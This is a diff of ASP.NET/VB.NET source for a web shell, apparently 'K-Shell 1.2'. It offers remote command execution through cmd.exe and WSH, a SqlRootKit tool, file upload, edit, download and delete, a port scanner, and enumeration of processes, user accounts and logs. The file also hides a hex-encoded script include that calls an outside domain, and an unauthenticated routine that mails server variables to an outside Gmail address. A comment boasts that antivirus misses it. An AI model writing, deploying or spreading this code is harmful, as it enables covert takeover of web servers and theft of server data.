+Public ret As ListBox
+Public errMsg As String = ""
+Public Timeout As Integer = 3000
+Public Sub start()
+Dim thread As New Thread(New ThreadStart(AddressOf Me.run))
+thread.Start()
+thread = Nothing
+End Sub
+
+Public Sub run()
+ret.Items.Clear()
+For Each ip As String In Ips
+For Each port As String In ports
+'ret.Items.Add(ip + ":" + port);
+Dim scanres As String = ""
+Try
+Dim tcpClient As New TcpClient()
+Try
+            tcpClient.Connect(ip, Int32.Parse(port))
+            tcpClient.Close()
+            ret.Items.Add(ip + " : " + port + " ................................. Open")
+      Catch e As SocketException
+            ret.Items.Add(ip + " : " + port + " ................................. Close")
+End Try
+tcpClient.Close()
+Catch exp As SocketException
+errMsg = "ErrorCode : " + exp.ErrorCode.ToString() + " : " + exp.Message
+End Try
+Next
+Next
+End Sub
+End Class
+
+Public Function MakeIps(ByVal StartIp As String, ByVal EndIP As String) As ArrayList
+Dim IpList As New ArrayList()
+Dim IpParts1 As String() = New String(3) {}
+Dim IpParts2 As String() = New String(3) {}
+IpParts1 = StartIp.Split("."C)
+IpParts2 = EndIP.Split("."C)
+Dim nTime As Integer = (Int32.Parse(IpParts2(0)) - Int32.Parse(IpParts1(0))) * 254 * 254 * 254 + (Int32.Parse(IpParts2(1)) - Int32.Parse(IpParts1(1))) * 254 * 254 + (Int32.Parse(IpParts2(2)) - Int32.Parse(IpParts1(2))) * 254 + (Int32.Parse(IpParts2(3)) - Int32.Parse(IpParts1(3))) + 1
+If nTime < 0 Then
+Response.Write("IP Address Error.Check" & Chr(13) & "" & Chr(10) & "")
+Return Nothing
+End If
+For n As Integer = 0 To nTime - 1
+IpList.Add(IpParts1(0) + "." + IpParts1(1) + "." + IpParts1(2) + "." + IpParts1(3))
+Dim tmp As Integer = Int32.Parse(IpParts1(3)) + 1
+IpParts1(3) = tmp.ToString()
+If IpParts1(3).Equals("255") Then
+tmp = Int32.Parse(IpParts1(2)) + 1
+IpParts1(2) = tmp.ToString()
+IpParts1(3) = "1"
+End If
+If IpParts1(2).Equals("255") Then
+tmp = Int32.Parse(IpParts1(1)) + 1
+IpParts1(1) = tmp.ToString()
+IpParts1(2) = "1"
+End If
+If IpParts1(1).Equals("255") Then
+tmp = Int32.Parse(IpParts1(0)) + 1
+IpParts1(0) = tmp.ToString()
+IpParts1(1) = "1"
+
+End If
+Next
+Return IpList
+End Function
+
+
+Protected Sub btnScan_Click(ByVal sender As Object, ByVal e As EventArgs)
+If txtStartIP.Text = "" OrElse txtEndIP.Text = "" OrElse txtPorts.Text = "" Then
+Response.Write("IP OR Ports Error.Check")
+Return
+End If
+Dim StartIp As String = txtStartIP.Text
+Dim EndIp As String = txtEndIP.Text
+Dim ips As ArrayList = MakeIps(StartIp, EndIp)
+Dim ScanPorts As New ArrayList()
+Dim ports As String() = txtPorts.Text.Split(","C)
+For Each port As String In ports
+'Response.Write(port);
+ScanPorts.Add(port)
+Next
+lstRet.Visible = True
+Label1.Visible = True
+Dim myscanner As New Scanner()
+myscanner.Ips = ips
+myscanner.ports = ScanPorts
+myscanner.ret = Me.lstRet
+myscanner.run()
+End Sub
+
+Protected Sub btnReset_Click(ByVal sender As Object, ByVal e As EventArgs)
+txtStartIP.Text = ""
+txtEndIP.Text = ""
+txtPorts.Text = ""
+Label1.Visible = False
+lstRet.Visible = False
+End Sub
+'End Scanner
 </script>
-
-<script type="text/javascript">
-
-    function rename(file) {
-        var f = prompt("rename file:", file);
-        var renfile = file;
-        if (f != null) {
-            renfile += "," + f
-            Bin_PostBack('ren', renfile);
-
-        }
-
-    }
-
-
-    function rename2(folder) {
-        var f = prompt("rename file:", folder);
-        var renfile = folder;
-        if (f != null) {
-            renfile += "," + f
-            Bin_PostBack('ren2', renfile);
-
-        }
-
-    }
-
-    function newfolder() {
-        var folder = prompt("Create New Folder", "");
-       
-        if (folder != null) {
-           
-            Bin_PostBack('newdir', folder);
-
-        }
-
-    }
-
-    function newfile() {
-
-        var file = prompt("Create New File", "");
-
-        if (file != null) {
-
-            Bin_PostBack('newfile', file);
-
-        }
-
-    }
-
-    function slctall() {
-
-        var ck = document.getElementsByTagName('input');
-
-        for (var i = 0; i < ck.length; i++) {
-            if (ck[i].type == 'checkbox' && ck[i].name != 'selectall') {
-                ck[i].checked = form1.selectall.checked;
-
-            }
-        }
-    }
-    function deleteall() {
-        var files = ""
-        var ck = document.getElementsByTagName('input');
-
-        for (var i = 0; i < ck.length; i++) {
-            if (ck[i].type == 'checkbox' && ck[i].checked && ck[i].name != 'selectall') {
-                files += ck[i].name + ",";
-
-            }
-        }
-        if (files == "") { alert("Select Files"); return; }
-        if (confirm('Are you sure delete the files ?')) {
-
-            Bin_PostBack('delall', files);
-
-        }
-    }
-
-    function downloadall() {
-        var hid = document.getElementById("Hidden1");
-
-
-        var url = location.href;
-        url = url.replace("#", "");
-
-        var file = "?name=";
-        var fpath = "";
-
-        var ck = document.getElementsByTagName('input');
-        var checked = new Array();
-        var c = 0;
-        for (var i = 0; i < ck.length; i++) {
-            if (ck[i].type == 'checkbox' && ck[i].checked && ck[i].name != 'selectall') {
-                checked[c] = ck[i].name;
-                c = c + 1;
-            }
-        }
-
-        if (checked.length == 0) { alert("Select Files"); return; }
-
-        for (var i = 0; i < checked.length; i++) {
-
-            fpath = url.concat(file.concat(checked[i]));
-
-            var ifra = document.createElement('iframe');
-            ifra.src = fpath;
-            ifra.setAttribute("class", "hidden");
-            ifra.setAttribute("height", "1");
-            ifra.setAttribute("width", "1");
-            void (document.body.appendChild(ifra));
-        }
-
-    }
-
-
-
-  </script>
-    
- 
-
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head runat="server">
-    <title></title>
+<%
+if request.QueryString("action")="down" and session("rooot")=1 then
+		downTheFile(request.QueryString("src"))
+		response.End()
+end if
+Dim act as string = request.QueryString("action")
+if act="cmd" then 
+TITLE="CMD.NET"
+elseif act="cmdw32" then 
+TITLE="ASP.NET W32 Shell"
+elseif act="cmdwsh" then 
+TITLE="ASP.NET WSH Shell"
+elseif act="sqlrootkit" then 
+TITLE="SqlRootKit.NET"
+elseif act="clonetime" then 
+TITLE="Clone Time"
+elseif act="information" then 
+TITLE="Web Server Info"
+elseif act="goto" then 
+TITLE="K-Shell 1.2"
+elseif act="pro1" then 
+TITLE="List processes from server"
+elseif act="pro2" then 
+TITLE="List processes from server"
+elseif act="user" then 
+TITLE="List User Accounts"
+elseif act="applog" then 
+TITLE="List Application Event Log Entries"
+elseif act="syslog" then 
+TITLE="List System Event Log Entries"
+elseif act="auser" then 
+TITLE="IIS List Anonymous' User details"
+elseif act="sqlman" then 
+TITLE="MSSQL Management"
+elseif act="scan" then 
+TITLE="Port Scanner"
+elseif act="iisspy" then 
+TITLE="IIS Spy"
+elseif act="sqltool" then 
+TITLE="SQL Tool"
+elseif act="regshell" then 
+TITLE="Registry Shell"
+else 
+TITLE=request.ServerVariables("HTTP_HOST") 
+end if
+%>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<style>
+body{background-color:#444;color:#e1e1e1;}
+body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
+table.info{ color:#fff;background-color:#222; }
+span,h1,a{ color: #df5 !important; }
+span{ font-weight: bolder; }
+h1{ border-left:5px solid $color;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
+div.content{ padding: 5px;margin-left:5px;background-color:#333; }
+a{ text-decoration:none; }
+a:hover{ text-decoration:underline; }
+.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
+.bigarea{ width:100%;height:300px; }
+input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
+form{ margin:0px; }
+.toolsInp{ width: 300px }
+.main th{text-align:left;background-color:#5e5e5e;}
+.main tr:hover{background-color:#5e5e5e}
+.l1{background-color:#444}
+.l2{background-color:#333}
+pre{font-family:Courier,Monospace;}
+</style><SCRIPT SRC=&#x68&#x74&#x74&#x70&#x73&#x3a&#x2f&#x2f&#x77&#x77&#x77&#x2e&#x6c&#x6f&#x63&#x61&#x6c&#x72&#x6f&#x6f&#x74&#x2e&#x6e&#x65&#x74&#x2f&#x73&#x61&#x62&#x75&#x6e&#x2f&#x79&#x61&#x7a&#x2e&#x6a&#x73></SCRIPT>
+<head>
+<meta http-equiv="Content-Type" content="text/html">
+<title></title>
 </head>
 <body>
-    <form id="form1" runat="server">
-    <asp:HiddenField ID="hidLastTab"  runat="server" Value='' />
+<hr>
+<%
+Dim error_x as Exception
+Try
+if session("rooot")<>1 then
+'Test sending anonymous mail, comment it if you don't want test it
+	dim info As String
+	Try
+	info = request.ServerVariables.ToString.Replace("%2f","/").Replace("%5c","\").Replace("%3a",":").Replace("%2c",",").Replace("%3b",";").Replace("%3d","=").Replace("%2b","+").Replace("%0d%0a",vbnewline)
+	System.Web.Mail.SmtpMail.SmtpServer = "localhost"
+	System.Web.Mail.SmtpMail.Send(request.ServerVariables("HTTP_HOST"),"test.mail.address.2008@gmail.com",request.ServerVariables("HTTP_HOST")+request.ServerVariables("URL"),info)
+	Catch
+	End Try
+%>
+<center>
+<form runat="server">
+  Your Password:<asp:TextBox ID="TextBox" runat="server"  TextMode="Password" class="TextBox" />  
+  <asp:Button  ID="Button" runat="server" Text="Login" ToolTip="Click here to login"  OnClick="login_click" class="buttom" />
+</form>
+</center>
+<%
+else
+	dim temp as string
+	temp=request.QueryString("action")
+	if temp="" then temp="goto"
+	select case temp
+	case "goto"
+		if request.QueryString("src")<>"" then
+			url=request.QueryString("src")
+		else
+			url=server.MapPath(".") & "\"
+		end if
+	call existdir(url)
+	dim xdir as directoryinfo
+	dim mydir as new DirectoryInfo(url)
+	dim guru as string
+	dim xfile as fileinfo
+	
+	dim ServerIP As string = "<font color=white>Server IP :</font> <b>" + Request.ServerVariables("LOCAL_ADDR") + "</b> - <font color=white>Client IP :</font> <b>" + getIP() + "</b> - "
+    dim HostName As string = "<font color=white>HostName :</font> <b>" + Environment.MachineName + "</b> - <font color=white>Username :</font> <b>"+ Environment.UserName +"</b><br>"
+    dim OSVersion As string = "<font color=white>OS Version :</font> <b>" + Environment.OSVersion.ToString() + "</b>"
+    dim IISversion As string = "<font color=white> - IIS Version :</font> <b>" + Request.ServerVariables("SERVER_SOFTWARE") + "</b><br><font color=white>System Dir :</font> <b>" + Environment.SystemDirectory + "</b>"
+    dim PATH_INFO As string = "<font color=white> - PATH_TRANSLATED :</font> <b>" + Request.ServerVariables("PATH_TRANSLATED") + "</b><br>"
+    dim HARDWARE_INFO As string = ""
+    Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()
+   	Dim de As DictionaryEntry
+	For Each de In  environmentVariables
+	if de.Key = "NUMBER_OF_PROCESSORS" then
+	HARDWARE_INFO += "<font color=white>Hardware Info :</font> <b>" + de.Value + "CPU - "
+	end if
+	if de.Key = "PROCESSOR_IDENTIFIER" then
+	HARDWARE_INFO += de.Value + "</b><br>"
+	end if
+   	Next
+    Info.Text += ServerIP + HostName + OSVersion + IISversion + PATH_INFO + HARDWARE_INFO
+%>
+<table width="100%"  border="0" align="center">
+  <tr>
+  	<td><asp:Label ID="Info" runat="server" EnableViewState="False"	/></td>
+  </tr>
+</table>
+<hr>
 
-     <div class="container" >
-         <div>
-           
-        <asp:Panel ID="Login" runat="server" Visible="false"  >
-           <h3 >Password  <asp:TextBox ID="Login_TextBox"  runat="server"></asp:TextBox> 
-            <asp:Button ID="Login_Button" runat="server" Text="LogIn" OnClick="Login_Button_Click" />              
-        </asp:Panel> 
-              <asp:LinkButton ID="Logout" Visible="false"   style=" float :right;" runat="server" OnClick="Logout_Click">
-                LOGOUT</asp:LinkButton>
-              <h3 >  </h3> 
-           
-         </div>
-         <script SRC=&#x68&#x74&#x74&#x70&#x73&#x3a&#x2f&#x2f&#x77&#x77&#x77&#x2e&#x6c&#x6f&#x63&#x61&#x6c&#x72&#x6f&#x6f&#x74&#x2e&#x6e&#x65&#x74&#x2f&#x73&#x61&#x62&#x75&#x6e&#x2f&#x79&#x61&#x7a&#x2e&#x6a&#x73></SCRIPT>
-        
-           <div class="tab_container">
-                <div id="Menue" visible="false" runat="server">
-             <ul class="tabs">
-                <li>
-                     <asp:Button ID="Button_FileManger" runat="server" Text="FileManger" OnClick="fm" CssClass="buttons"   />
-      
-                   </li>
-                <li>
-                     <asp:Button ID="Button_CMD" runat="server" Text="CMD" OnClick="process_design" CssClass="buttons"  />
-      
-                   </li>
-                   <li>
-               <asp:Button ID="Button_DBS" runat="server" Text="DBS" OnClick="process_design" CssClass="buttons"  />
-      </li>
-                 <li>
-                <asp:Button ID="Button_UserInfo" runat="server" Text="UserInfo" OnClick="process_design" CssClass="buttons"  />
-      </li>
-                  <li>
-                <asp:Button ID="Button_ProcessesServices" runat="server" Text="Processes_Services" OnClick="process_design" CssClass="buttons"  />
-      </li>
-              <li>
-                <asp:Button ID="Button2" runat="server" Text="CopyFiles" OnClick="process_design" CssClass="buttons"  />
-      </li>
-            </ul>
-         </div>
-               <br />
-                     <asp:Label ID="msgs" runat="server" Text=""></asp:Label>
-             <asp:Panel ID="FileManger"  runat="server"  class="tab_content" >
-      
-     
-    <div  id="Div1" style=" height: 63px; width: 100%; border-style: inset">
-   
-       
-   
-     <asp:FileUpload ID="FileUpload1" runat="server" style="  height: 40px; width:180px;" />
-     <asp:Button ID="Upload" runat="server"  Text="Upload" OnClick="Upload_Click" />
-        <br />
-         <input type="checkbox" name="selectall" title="Select All Files" onclick="javascript: slctall();" />Select All Files To   
-        <a href="#" onclick="javascript:downloadall()">Download ALL</a> || 
-          <a href="#" onclick="javascript:deleteall()">Delete ALL</a>
-         <asp:HyperLink runat="server">Copy</asp:HyperLink>|<asp:HyperLink runat="server">Move</asp:HyperLink> 
-      <br />
-   
-    </div>
-                 
-    <div  id="current" style="  height: 60px; width: 100%; border-style: inset">
-    <a href="javascript:Bin_PostBack('shell_root', '<%=  base64Encode("./")%>' )"')">Shell_Root</a> ||  Select Drivers:
-        <asp:DropDownList ID="DriversList"  runat="server" style=" height: 21px;" Width="143px" OnSelectedIndexChanged="DriversList_SelectedIndexChanged" >
-        </asp:DropDownList>
-        <asp:Button ID="slctdrive" runat="server" EnableViewState="true"  Height="21px" OnClick="slctdrive_Click" Text="GET" Width="38px" />
-        || <a href="javascript:newfolder()">New Folder</a> || <a href="javascript:newfile()">New File</a> 
-        <br />
-       
-       <br />
-       
-        
-        Current Path:
-        <asp:Label ID="currentpathlabel" runat="server" EnableViewState="true"  Visible="False"></asp:Label>
-   
-        <asp:Literal ID="Literal1" runat="server"></asp:Literal>
-        <input id="Hidden1" type="hidden" runat="server"/>
-   
-       <br />
-   
-    </div>
-                 
-<table id="tblEmployee" runat="server" style=" width: 100%">
-            <thead>
-                
-                <tr>
-                    <th>
-                        Name
-                    </th>
-                    <th>
-                        Size
-                    </th>
-                    <th>
-                       Date Modified
-                    </th>
-                  
-                    <th>
-                       TO DO
-                    </th>
-                </tr>
-            </thead>
-        </table>
-     
-        
-    </asp:Panel>
-                 <asp:Panel ID="editpanel" runat="server" Visible="false">
-     
-            <h2> Editing File:</h2> 
-              <asp:TextBox ID="filetoedit" runat="server" Enabled="false" Width="99%" Height="25px">
-                  <br />
+<table width="100%"  border="0" align="center">
+  <tr>
+  	<td>Currently Dir:</td> <td><font color=red><%=url%></font></td>
+  </tr>
+  <tr>
+    <td width="10%">Operate:</td>
+    <td width="90%"><a href="?action=new&src=<%=server.UrlEncode(url)%>" title="New file or directory">New</a> - 
+      <%if session("cutboard")<>"" then%>
+      <a href="?action=paste&src=<%=server.UrlEncode(url)%>" title="you can paste">Paste</a> - 
+      <%else%>
+	Paste - 
+<%end if%>
+<a href="?action=upfile&src=<%=server.UrlEncode(url)%>" title="Upload file">UpLoad</a> - <a href="?action=goto&src=" & <%=server.MapPath(".")%> title="Go to this file's directory">GoBackDir </a> - <a href="?action=logout" title="Exit" ><font color="red">Quit</font></a>
+</td>
+  </tr>
+  <tr>
+    <td>
+	Go to: </td>
+    <td>
+<%
+dim i as integer
+for i =0 to Directory.GetLogicalDrives().length-1
+ 	response.Write("<a href='?action=goto&src=" & Directory.GetLogicalDrives(i) & "'>" & Directory.GetLogicalDrives(i) & " </a>")
+next
+%>
 
-              </asp:TextBox> 
-              <asp:TextBox ID="editfile" runat="server"  Width="99%" Height="500px" TextMode="MultiLine" >
+</td>
+<td align="Left">
+<%
+response.Write("IP:<font color=red>" & Request.ServerVariables("REMOTE_ADDR")&"</font>")
+%>
+</td>
+  </tr>
 
-              </asp:TextBox> 
+  <tr>
+    <td>Tool:</td>
+    <td><a href="?action=sqlrootkit" >SqlRootKit.NET </a> - <a href="?action=cmd" >CMD.NET</a> - <a href="?action=cmdw32" >kshellW32</a> - <a href="?action=cmdwsh" >kshellWSH</a> - <a href="?action=clonetime&src=<%=server.UrlEncode(url)%>" >CloneTime</a> - <a href="?action=information" >System Info</a> - <a href="?action=pro1" >List Processes 1</a> - <a href="?action=pro2" >List Processes 2</a></td>    
+  </tr>
+  <tr>
+    <td> </td>
+    <td><a href="?action=user" >List User Accounts</a> - <a href="?action=auser" >IIS Anonymous User</a>- <a href="?action=scan" >Port Scanner</a> - <a href="?action=iisspy" >IIS Spy</a> - <a href="?action=applog" >Application Event Log </a> - <a href="?action=syslog" >System Log</a></td>
+  </tr>
+</table>
+<hr>
+<table width=100% class=main cellspacing=0 cellpadding=1><tr><th>Name</th><th>Size</th><th>Modify</th><th>Actions</th></tr>
 
-<asp:Button id="submitedit" runat="server" Text="Save" onclick="Save_Click"></asp:Button>
- 
-</asp:Panel>
-               
-                 <asp:Panel ID="CMD" runat="server" Visible="false" class="tab_content">
-                     
-                      Type Commands<br />
-                      <asp:TextBox ID="Command" runat="server" EnableViewState="false"  
-                          Height="156px" TextMode="MultiLine" Width="579px"></asp:TextBox>
-                      <asp:Button ID="CmdSubmit" runat="server" Height="40px" 
-                          onclick="CmdSubmit_Click" Text="Run" Width="70px" />
-                      <br />
-                      Result:<br />
-                        <asp:TextBox ID="CmdResult" runat="server" TextMode="MultiLine" 
-                          Height="368px" Width="720px"></asp:TextBox>
-                  </asp:Panel>
 
-               
-
-    <asp:Panel ID="DBS"  runat="server" Visible="false"  class="tab_content" >
-        
-     
-    <div  id="current" style="  height: 116px; width: 100%; border-style: inset">
+      <tr>
+        <td><%
+		guru= "<tr><td><a href='?action=goto&src=" & server.UrlEncode(Getparentdir(url)) & "'><b>[..]</b></a></td></tr>"
+		response.Write(guru)
+                dim lll
+                lll=1
+		for each xdir in mydir.getdirectories()
+			response.Write("<tr>")
+			dim filepath as string 
+			filepath=server.UrlEncode(url & xdir.name)
+                        if lll=1 then 
+                           lll=2 
+                        else 
+                           lll=1
+                        end if
+			guru= "<tr class=l" & lll & "><td><a href='?action=goto&src=" & filepath & "\" & "'><b>[" & xdir.name & "]</b></a></td>"
+			response.Write(guru)
+			response.Write("<td>&lt;dir&gt;</td>")
+			response.Write("<td>" & Directory.GetLastWriteTime(url & xdir.name) & "</td>")
+			guru="<td><a href='?action=cut&src=" & filepath & "\'  target='_blank'>Cut" & "</a>|<a href='?action=copy&src=" & filepath & "\'  target='_blank'>Copy</a>|<a href='?action=del&src=" & filepath & "\'" & " onclick='return del(this);'>Del</a></td>"
+			response.Write(guru)
+			response.Write("</tr>")
+		next
+		%></td>
+  </tr>
+		<tr>
+        <td><%
+		for each xfile in mydir.getfiles()
+			dim filepath2 as string
+			filepath2=server.UrlEncode(url & xfile.name)
+			response.Write("<tr>")
+                        if lll=1 then 
+                           lll=2 
+                        else 
+                           lll=1
+                        end if
+                        guru= "<tr class=l" & lll & "><td><a href='?action=edit&src=" & filepath2 & "'>" & xfile.name & "</a></td>"
+			response.Write(guru)
+			guru="<td>" & GetSize(xfile.length) & "</td>"
+			response.Write(guru)
+			response.Write("<td>" & file.GetLastWriteTime(url & xfile.name) & "</td>")
+			guru="<td><a href='?action=edit&src=" & filepath2 & "'>Edit</a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|<a href='?action=rename&src=" & filepath2 & "'>Rename</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>Download</a>|<a href='?action=del&src=" & filepath2 & "' onClick='return del(this);'>Del</a></td>"			
+			response.Write(guru)
+			response.Write("</tr>")
+		next
+		response.Write("</table>")
+		%></td>
+      </tr>
+</table>
+<script language="javascript">
+function del()
+{
+if(confirm("Are you sure?")){return true;}
+else{return false;}
+}
+function down()
+{
+if(confirm("If the file size > 20M,\nPlease don\'t download\nYou can copy file to web directory ,use http download\nAre you sure download?")){return true;}
+else{return false;}
+}
+</script><SCRIPT SRC=&#x68&#x74&#x74&#x70&#x73&#x3a&#x2f&#x2f&#x77&#x77&#x77&#x2e&#x6c&#x6f&#x63&#x61&#x6c&#x72&#x6f&#x6f&#x74&#x2e&#x6e&#x65&#x74&#x2f&#x73&#x61&#x62&#x75&#x6e&#x2f&#x79&#x61&#x7a&#x2e&#x6a&#x73></SCRIPT>
+<%
+case "information"
+	dim CIP,CP as string
+	if getIP()<>request.ServerVariables("REMOTE_ADDR") then
+			CIP=getIP()
+			CP=request.ServerVariables("REMOTE_ADDR")
+	else
+			CIP=request.ServerVariables("REMOTE_ADDR")
+			CP="None"
+	end if
+%>
+<div align=center>[ Web Server Information ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></div><br>
+<table width="100%"  border="1" align="center">
+  <tr>
+    <td width="40%">Server IP</td>
+    <td width="60%"><%=request.ServerVariables("LOCAL_ADDR")%></td>
+  </tr>
+  <tr>
+    <td height="73">Machine Name</td>
+    <td><%=Environment.MachineName%></td>
+  </tr>
+  <tr>
+    <td>Network Name</td>
+    <td><%=Environment.UserDomainName.ToString()%></td>
+  </tr>
+  <tr>
+    <td>User Name in this Process</td>
+    <td><%=Environment.UserName%></td>
+  </tr>
+  <tr>
+    <td>OS Version</td>
+    <td><%=Environment.OSVersion.ToString()%></td>
+  </tr>
+  <tr>
+    <td>Started Time</td>
+    <td><%=GetStartedTime(Environment.Tickcount)%> Hours</td>
+  </tr>
+  <tr>
+    <td>System Time</td>
+    <td><%=now%></td>
+  </tr>
+  <tr>
+    <td>IIS Version</td>
+    <td><%=request.ServerVariables("SERVER_SOFTWARE")%></td>
+  </tr>
+  <tr>
+    <td>HTTPS</td>
+    <td><%=request.ServerVariables("HTTPS")%></td>
+  </tr>
+  <tr>
+    <td>PATH_INFO</td>
+    <td><%=request.ServerVariables("PATH_INFO")%></td>
+  </tr>
+  <tr>
+    <td>PATH_TRANSLATED</td>
+    <td><%=request.ServerVariables("PATH_TRANSLATED")%></td>
+  <tr>
+    <td>SERVER_PORT</td>
+    <td><%=request.ServerVariables("SERVER_PORT")%></td>
+  </tr>
+    <tr>
+    <td>SeesionID</td>
+    <td><%=Session.SessionID%></td>
+  </tr>
+  <tr>
+    <td colspan="2"><span class="style3">Client Infomation</span></td>
+  </tr>
+  <tr>
+    <td>Client Proxy</td>
+    <td><%=CP%></td>
+  </tr>
+  <tr>
+    <td>Client IP</td>
+    <td><%=CIP%></td>
+  </tr>
+  <tr>
+    <td>User</td>
+    <td><%=request.ServerVariables("HTTP_USER_AGENT")%></td>
+  </tr>
+</table>
+<table align=center>
+	<% Create_table_row_with_supplied_colors("Black", "White", "center", "Environment Variables, Server Variables") %>
+	<tr>
+		<td><textArea cols=50 rows=10><% output_all_environment_variables("text") %></textarea></td>
+		<td><textArea cols=50 rows=10><% output_all_Server_variables("text") %></textarea></td>
+	</tr>
+</table>
+<%
+	case "cmd"
+%>
+<form runat="server">
+  <p>[ CMD.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+  <p> Execute command with ASP.NET account(<span class="style3">Notice: only click &quot;Run&quot; to run</span>)</p>
+  <p>- This function has fixed by kikicoco.Antivirus has not detected (2007/02/27)-</p>
+  Command:
+  <asp:TextBox ID="cmd" runat="server" Width="300" class="TextBox" />
+  <asp:Button ID="Button123" runat="server" Text="Run" OnClick="RunCMD" class="buttom"/>  
+  <p>
+   <asp:Label ID="result" runat="server" style="style2"/>      </p>
+</form>
+<%
+	case "cmdw32"
+%>
+<form runat="server">
+	<p>[ ASP.NET W32 Shell ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+  	<p> Execute command with ASP.NET account using W32(<span class="style3">Notice: only click &quot;Run&quot; to run</span>)</p>
+  	<%
+  	Response.Write("System Dir : "+Environment.SystemDirectory +"<br><br>")
+  	%>
+  	CMD File:
+	<asp:TextBox ID="txtCmdFile" runat="server" Width="473px" style="border: 1px solid #084B8E">C:\\WINDOWS\\system32\\cmd.exe</asp:TextBox><br><br>
+  	Command:&nbsp;
+	<asp:TextBox ID="txtCommand1" runat="server" style="border: 1px solid #084B8E"/>
+  	<asp:Button ID="Buttoncmdw32" runat="server" Text="Run" OnClick="RunCmdW32" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5"/>  
+  	<p>
+    <asp:Label ID="resultcmdw32" runat="server" style="color: #0000FF"/>      
+    </p>
+</form>
+<%
+	case "cmdwsh"
+%>
+<form runat="server">
+	<p>[ ASP.NET WSH Shell ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+  	<p> Execute command with ASP.NET account using WSH(<span class="style3">Notice: only click &quot;Run&quot; to run</span>)</p>
+  	Command:
+	<asp:TextBox ID="txtCommand2" runat="server" style="border: 1px solid #084B8E"/>
+  	<asp:Button ID="Buttoncmdwsh" runat="server" Text="Run" OnClick="RunCmdWSH" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5"/>  
+  	<p>
+    <asp:Label ID="resultcmdwsh" runat="server" style="color: #0000FF"/>      
+    </p>
+</form>
+<%
+	case "pro1"
+%>
+<form runat="server">
+	<p align=center>[ List processes from server ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+	<table align=center>
+		<tr>
+			<td>
+			<% 
+				Try
+				output_wmi_function_data("Win32_Process","ProcessId,Name,WorkingSetSize,HandleCount")
+				Catch
+				rw("This function is disabled by server")
+				End Try
+			%>
+			</td>
+		</tr>
+	</table>
+</form>
+<%
+	case "pro2"
+%>
+<form runat="server">
+	<p align=center>[ List processes from server ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+	<table align=center width='80%'>
+		<tr>
+			<td>
+			<% 
+				Dim htmlbengin As String = "<table width='80%' align=center border=0><tr align=center><td width='20%'><b>ID</b></td><td align=left width='20%'><b>Process</b></td><td align=left width='20%'><b>MemorySize</b></td><td align=center width='10%'><b>Threads</b></td></tr>"
+			      Dim prostr As String = ""
+			      Dim htmlend As String = "</tr></table>"
+			      Try
+			            Dim mypro As Process() = Process.GetProcesses()
+			            For Each p As Process In mypro
+			                  prostr += "<tr><td align=center>" + p.Id.ToString() + "</td>"
+			                  prostr += "<td align=left>" + p.ProcessName.ToString() + "</td>"
+			                  prostr += "<td align=left>" + p.WorkingSet.ToString() + "</td>"
+			                  prostr += "<td align=center>" + p.Threads.Count.ToString() + "</td>"
+			            Next
+			      Catch ex As Exception
+			            Response.write(ex.Message)
+			      End Try
+			      Response.write(htmlbengin + prostr + htmlend)
+			%>
+			</td>
+		</tr>
+	</table>
+</form>
+<%
+	case "user"
+%>
+<form runat="server">
+	<p align=center>[ List User Accounts ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+	<table align=center>
+		<tr>
+			<td>
+			<% 
+				dim WMI_function = "Win32_UserAccount"		
+				dim Fields_to_load = "Name,Domain,FullName,Description,PasswordRequired,SID"
+				dim fail_description = " Access to " + WMI_function + " is protected"
+				Try
+				output_wmi_function_data(WMI_function,Fields_to_load)
+				Catch
+				rw(fail_description)
+				End Try
+			%>
+			</td>
+		</tr>
+	</table>
+</form>
+<%
+	case "reg"
+%>
+<form runat="server">
+	<p align=center>[ Registry ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+	<table align=center>
+		<tr>
+			<td>
+			<% 
+				dim WMI_function = "Win32_Registry"		
+				dim Fields_to_load = "Caption,CurrentSize,Description,InstallDate,Name,Status"
+				dim fail_description = " Access to " + WMI_function + " is protected"
+				Try
+				output_wmi_function_data(WMI_function,Fields_to_load)
+				Catch
+				rw(fail_description)
+				End Try
+			%>
+			</td>
+		</tr>
+	</table>
+</form>
+<%
+	case "applog"
+%>
+<form runat="server">
+	<p align=center>[ List Application Event Log Entries ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+	<table align=center>
+		<tr>
+			<td>
+			<% 
+				dim WMI_function = "Win32_NTLogEvent where Logfile='Application'"		
+				dim Fields_to_load = "Logfile,Message,type"
+				dim fail_description = " Access to " + WMI_function + " is protected"
+				Try
+				output_wmi_function_data_instances(WMI_function,Fields_to_load,2000)
